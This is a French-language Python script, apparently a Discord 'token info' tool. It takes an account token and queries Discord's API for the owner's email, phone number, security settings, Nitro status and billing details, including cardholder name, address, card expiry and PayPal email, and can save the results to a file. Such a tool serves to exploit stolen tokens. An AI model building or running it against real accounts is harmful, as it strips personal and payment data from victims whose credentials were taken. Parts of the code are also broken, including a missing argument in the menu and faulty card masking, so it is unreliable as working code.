import time
import requests
import os
from datetime import datetime
from colorama import Fore, Style, init
import json

init(autoreset=True)

def set_title(title):
    print(f"\033]0;{title}\a", end='', flush=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def token_info_title():
    print(Fore.CYAN + Style.BRIGHT + "Informations sur le token\n")

def get_token():
    print(Fore.YELLOW + "Entrez le token pour lequel vous voulez trouver des informations")
    return input(Fore.GREEN + "Token: ")

def check_token(headers):
    try:
        response = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException:
        return False

def get_user_info(headers):
    try:
        response = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Erreur lors de la requête utilisateur : {e}")
        return None

def get_nitro_info(headers):
    try:
        response = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Erreur lors de la requête Nitro : {e}")
        return None

def get_billing_info(headers):
    try:
        response = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Erreur lors de la requête de facturation : {e}")
        return None

def save_to_file(data, username):
    filename = f"{username}.txt"
    try:
        with open(filename, 'w') as file:
            json.dump(data, file, indent=4)
        print(Fore.GREEN + f"Les informations ont été sauvegardées dans le fichier {filename}")
    except IOError as e:
        print(Fore.RED + f"Erreur lors de la sauvegarde dans le fichier : {e}")

def display_user_info(user_info, token, languages, creation_date, avatar_url):
    print(Fore.MAGENTA + Style.BRIGHT + "Informations de base :")
    print(f"{Fore.CYAN}Nom d'utilisateur : {Fore.WHITE}{user_info['username']}#{user_info['discriminator']}")
    print(f"{Fore.CYAN}ID utilisateur : {Fore.WHITE}{user_info['id']}")
    print(f"{Fore.CYAN}Date de création : {Fore.WHITE}{creation_date}")
    print(f"{Fore.CYAN}URL de l'avatar : {Fore.WHITE}{avatar_url}")
    print(f"{Fore.CYAN}Token : {Fore.WHITE}{token}\n")

def display_nitro_info(nitro_info, has_nitro, days_left):
    print(Fore.MAGENTA + Style.BRIGHT + "Informations Nitro :")
    print(f"{Fore.CYAN}Statut Nitro : {Fore.WHITE}{'Oui' if has_nitro else 'Non'}")
    print(f"{Fore.CYAN}Expire dans : {Fore.WHITE}{days_left} jour(s)\n")

def display_contact_info(user_info):
    print(Fore.MAGENTA + Style.BRIGHT + "Informations de contact :")
    print(f"{Fore.CYAN}Numéro de téléphone : {Fore.WHITE}{user_info['phone'] or 'Non disponible'}")
    print(f"{Fore.CYAN}Email : {Fore.WHITE}{user_info['email'] or 'Non disponible'}\n")

def display_billing_info(billing_info):
    if billing_info:
        print(Fore.MAGENTA + Style.BRIGHT + "Informations de facturation :")
        for i, info in enumerate(billing_info, start=1):
            print(f"{Fore.YELLOW}Méthode de paiement #{i} ({info['Type de paiement']})")
            for key, value in info.items():
                print(f"{Fore.CYAN}    {key} : {Fore.WHITE}{value}")
            print()

def display_security_info(user_info):
    print(Fore.MAGENTA + Style.BRIGHT + "Sécurité du compte :")
    print(f"{Fore.CYAN}2FA/MFA Activé : {Fore.WHITE}{'Oui' if user_info['mfa_enabled'] else 'Non'}")
    print(f"{Fore.CYAN}Drapeaux : {Fore.WHITE}{user_info['flags']}\n")

def display_other_info(user_info, languages):
    print(Fore.MAGENTA + Style.BRIGHT + "Autres :")
    print(f"{Fore.CYAN}Locale : {Fore.WHITE}{user_info['locale']} ({languages.get(user_info['locale'], 'Inconnu')})")
    print(f"{Fore.CYAN}Email Vérifié : {Fore.WHITE}{'Oui' if user_info['verified'] else 'Non'}")

def menu():
    print(Fore.YELLOW + "\nMenu :")
    print(Fore.GREEN + "1. Afficher les informations sur le token")
    print(Fore.GREEN + "2. Sauvegarder les informations dans un fichier")
    print(Fore.GREEN + "3. Quitter")
    return input(Fore.CYAN + "\nChoisissez une option : ")

def main():
    set_title("Informations sur le token")
    clear()
    token_info_title()

    token = get_token()

    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }

    if not check_token(headers):
        print(Fore.RED + "Token invalide")
        return

    user_info = get_user_info(headers)
    if not user_info:
        return

    user_id = user_info['id']
    username = user_info['username']
    avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{user_info["avatar"]}.gif'
    creation_date = datetime.fromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')

    nitro_info = get_nitro_info(headers)
    has_nitro = bool(nitro_info)
    days_left = 0
    if has_nitro:
        d1 = datetime.strptime(nitro_info[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        d2 = datetime.strptime(nitro_info[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        days_left = abs ((d2 - d1).days)

    languages = {
        'da': 'Danois, Danemark', 'de': 'Allemand, Allemagne', 'en-GB': 'Anglais, Royaume-Uni',
        'en-US': 'Anglais, États-Unis', 'es-ES': 'Espagnol, Espagne', 'fr': 'Français, France',
        'hr': 'Croate, Croatie', 'lt': 'Lituanien, Lituanie', 'hu': 'Hongrois, Hongrie',
        'nl': 'Néerlandais, Pays-Bas', 'no': 'Norvégien, Norvège', 'pl': 'Polonais, Pologne',
        'pt-BR': 'Portugais, Brésil', 'ro': 'Roumain, Roumanie', 'fi': 'Finlandais, Finlande',
        'sv-SE': 'Suédois, Suède', 'vi': 'Vietnamien, Vietnam', 'tr': 'Turc, Turquie',
        'cs': 'Tchèque, République tchèque', 'el': 'Grec, Grèce', 'bg': 'Bulgare, Bulgarie',
        'ru': 'Russe, Russie', 'uk': 'Ukrainien, Ukraine', 'th': 'Thaï, Thaïlande',
        'zh-CN': 'Chinois, Chine', 'ja': 'Japonais', 'zh-TW': 'Chinois, Taïwan', 'ko': 'Coréen, Corée'
    }

    billing_info = []
    payment_sources = get_billing_info(headers)
    if payment_sources:
        for source in payment_sources:
            billing_address = source['billing_address']
            name = billing_address['name']
            address_1 = billing_address['line_1']
            address_2 = billing_address.get('line_2', '')
            city = billing_address['city']
            postal_code = billing_address['postal_code']
            state = billing_address.get('state', '')
            country = billing_address['country']

            if source['type'] == 1:
                cc_brand = source['brand']
                cc_first = '*' * 12 + source['last_4'][:4]
                cc_last = source['last_4'][4:]
                cc_month = f"{source['expires_month']:02}"
                cc_year = str(source['expires_year'])[2:4]

                data = {
                    'Type de paiement': 'Carte de crédit',
                    'Valide': not source['invalid'],
                    'Nom du titulaire de la carte': name,
                    'Marque de la carte': cc_brand.title(),
                    'Numéro de la carte': f"{cc_first}{'*' * 3}{cc_last}",
                    'Date d\'expiration de la carte': f"{cc_month}/{cc_year}",
                    'Adresse 1': address_1,
                    'Adresse 2': address_2,
                    'Ville': city,
                    'Code postal': postal_code,
                    'État': state,
                    'Pays': country,
                    'Méthode de paiement par défaut': source['default']
                }

            elif source['type'] == 2:
                data = {
                    'Type de paiement': 'PayPal',
                    'Valide': not source['invalid'],
                    'Nom PayPal': name,
                    'Email PayPal': source['email'],
                    'Adresse 1': address_1,
                    'Adresse 2': address_2,
                    'Ville': city,
                    'Code postal': postal_code,
                    'État': state,
                    'Pays': country,
                    'Méthode de paiement par défaut': source['default']
                }

            billing_info.append(data)

    display_user_info(user_info, token, languages, creation_date, avatar_url)
    display_nitro_info(nitro_info, has_nitro, days_left)
    display_contact_info(user_info)
    display_billing_info(billing_info)
    display_security_info(user_info)
    display_other_info(user_info, languages)

    while True:
        choice = menu()
        if choice == '1':
            clear()
            token_info_title()
            display_user_info(user_info, token, languages, creation_date, avatar_url)
            display_nitro_info(nitro_info)
            display_contact_info(user_info)
            display_billing_info(billing_info)
            display_security_info(user_info)
            display_other_info(user_info, languages)
            break
        elif choice == '2':
            save_to_file({
                'user_info': user_info,
                'nitro_info': nitro_info,
                'billing_info': billing_info
            }, username)
            break
        elif choice == '3':
            print(Fore.CYAN + "Merci d'avoir utilisé le script !")
            break
        else:
            print(Fore.RED + "Option invalide, veuillez réessayer.")
    

if __name__ == "__main__":
    main()


# by Furkan-FRTR